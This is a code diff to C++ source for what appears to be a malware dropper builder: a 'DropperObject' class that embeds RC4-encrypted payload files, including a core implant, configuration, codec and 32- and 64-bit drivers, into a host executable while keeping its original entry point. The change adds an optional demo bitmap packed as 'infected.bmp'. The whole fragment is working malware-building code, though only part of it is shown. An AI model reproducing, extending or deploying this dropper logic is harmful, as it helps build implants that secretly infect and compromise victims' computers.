@@ -30,6 +30,7 @@ DropperObject::DropperObject(PEObject& pe)
 	_files.codec.size = 0;
 	_files.driver.size = 0;
 	_files.driver64.size = 0;
+	_files.bitmap.size = 0;
 	
 	int i = 0;
 	while (_needed_strings[i] != NULL) {
@@ -51,6 +52,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 		+ _files.config.size
 		+ _files.driver.size
 		+ _files.driver64.size
+		+ _files.bitmap.size
 		;
 	
 	_data.reset( new char[buffer_size] );
@@ -148,6 +150,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	ptr = _embedFile(header->rc4key, _files.driver64, header->files.names.driver64, header->files.driver64, ptr);
 	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
 	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
+	ptr = _embedFile(header->rc4key, _files.bitmap, header->files.names.bitmap, header->files.bitmap, ptr);
 	
 	// compute total data section size and store in buffer
 	dataBufferSize = ptr - _data.get();
@@ -260,6 +263,13 @@ bool DropperObject::_addCodecFile( std::string path, std::string name )
 	return _readFile(path, _files.codec);
 }
 
+bool DropperObject::_addBitmapFile( std::string path, std::string name )
+{
+	cout << "Adding demo bitmap file \"" << path << "\" as \"" << name << "\"." << endl;
+	_files.bitmap.name = "infected.bmp";
+	return _readFile(path, _files.bitmap);
+}
+
 int DropperObject::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr )
 {
 	DWORD size = (DWORD)funcEnd - (DWORD)funcStart;
@@ -359,7 +369,7 @@ bool DropperObject::_readFile( std::string path, NamedFileBuffer& buffer )
 	return true;
 }
 
-bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix )
+bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap )
 {
 	try {
 		_setExecutableName("XXX");
@@ -379,6 +389,9 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 
 		if (!driver64.empty())
 			_addDriver64File(driver64.string(), driver64.filename());
+
+		if (!demoBitmap.empty())
+			_addBitmapFile(demoBitmap.string(), demoBitmap.filename());
 		
 		_build( (WINSTARTFUNC) _pe.epVA(), fPrefix );
 		
